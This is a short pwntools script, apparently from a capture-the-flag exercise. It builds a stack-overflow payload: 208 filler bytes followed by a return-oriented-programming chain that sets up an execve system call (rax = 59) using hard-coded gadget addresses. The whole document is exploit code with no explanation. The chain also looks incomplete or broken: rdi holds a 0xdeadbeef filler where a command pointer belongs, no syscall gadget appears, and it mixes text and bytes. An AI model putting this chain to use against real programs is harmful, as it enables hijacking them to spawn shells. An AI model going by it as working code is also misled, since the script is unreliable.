from pwn import *

print("DEBUG\n\0")
ret = 0x401212
pop_rsi_rf = p64(0x0000000000401429)
pop_rax = p64(0x0000000000401162)
pop_rdi = p64(0x000000000040142b)
pad = p64(0xdeadbeefdeadbeef)
print("AAAAAAAA" * 26 + pop_rax + p64(59) + pop_rdi + pad + pop_rsi_rf + p64(0) + pad)
